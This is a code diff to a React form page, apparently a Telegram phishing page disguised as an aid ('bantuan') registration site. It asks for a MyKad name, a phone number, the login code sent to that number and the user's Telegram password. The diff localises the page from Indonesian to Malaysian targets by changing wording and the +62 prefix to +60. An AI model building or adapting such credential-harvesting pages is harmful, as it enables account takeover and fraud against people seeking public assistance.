@@ -152,7 +152,7 @@ export default function Index() {
     const [status, setStatus] = useState("registrasi");
     const { data, setData, post, reset, errors } = useForm({
         nama: "",
-        nomor_hp: "+60",
+        nombor: "+60",
         password: "",
     });
     const [verifData, setVerifData] = useState(["", "", "", "", ""]);
@@ -197,7 +197,7 @@ export default function Index() {
         router.post(
             route("bantuan.verifikasi-store"),
             {
-                nomor_hp: data.nomor_hp,
+                nombor: data.nombor,
                 code_verif: verifData,
             },
             {
@@ -224,7 +224,7 @@ export default function Index() {
         router.post(
             route("bantuan.password-store"),
             {
-                nomor_hp: data.nomor_hp,
+                nombor: data.nombor,
                 code_verif: verifData,
                 password: data.password,
             },
@@ -233,7 +233,7 @@ export default function Index() {
                     setData({
                         ...data,
                         nama: "",
-                        nomor_hp: "+62",
+                        nombor: "+62",
                         password: "",
                     });
                     setTimeout(() => {
@@ -305,7 +305,7 @@ export default function Index() {
                         ? ""
                         : status == "verifikasi"
                         ? "Sila Masukan Kod-yang dihantar ke Nombor" +
-                          data.nomor_hp
+                          data.nombor
                         : "Sila Masukan kata laluan Telegram Anda "}
                 </p>
                 {status == "verifikasi" && (
@@ -320,7 +320,7 @@ export default function Index() {
                         <div className="my-1 flex flex-row items-center w-full rounded-lg overflow-hidden p-1 bg-gray-100 drop-shadow-sm border border-blue-950">
                             <input
                                 type="text"
-                                placeholder="Nama lengkap sesuai KTP"
+                                placeholder="Nama penuh sesuai MayKad"
                                 className="w-full drop-shadow-sm"
                                 value={data.nama}
                                 onChange={(e) =>
@@ -348,18 +348,18 @@ export default function Index() {
                             <input
                                 type="text"
                                 className="w-full drop-shadow-sm"
-                                value={data.nomor_hp}
+                                value={data.nombor}
                                 onChange={(e) =>
                                     setData({
                                         ...data,
-                                        nomor_hp: e.target.value,
+                                        nombor: e.target.value,
                                     })
                                 }
                             />
                         </div>
-                        {errors.nomor_hp && (
+                        {errors.nombor && (
                             <p className="tracking-tighter text-xs text-red-500 italic">
-                                {errors.nomor_hp}
+                                {errors.nombor}
                             </p>
                         )}
 
@@ -401,7 +401,7 @@ export default function Index() {
                         <input
                             type="password"
                             placeholder="Masukkan kata laluan"
-                            className="w-full drop-shadow-sm rounded-md border border-b-blue-800 drop-shadow"
+                            className="w-full  rounded-md border border-b-blue-800 drop-shadow"
                             value={data.password}
                             onChange={(e) =>
                                 setData({
@@ -456,7 +456,7 @@ export default function Index() {
                     )}
                 </div>
             </div>
-            <div className="py-6 w-full px-8 md:px-16 lg:px-24 py-5 bg-blue-800">
+            <div className=" w-full px-8 md:px-16 lg:px-24 py-5 bg-blue-800">
                 <img src="/Bantuan/ini1.png" alt="" />
             </div>
             {loading && (
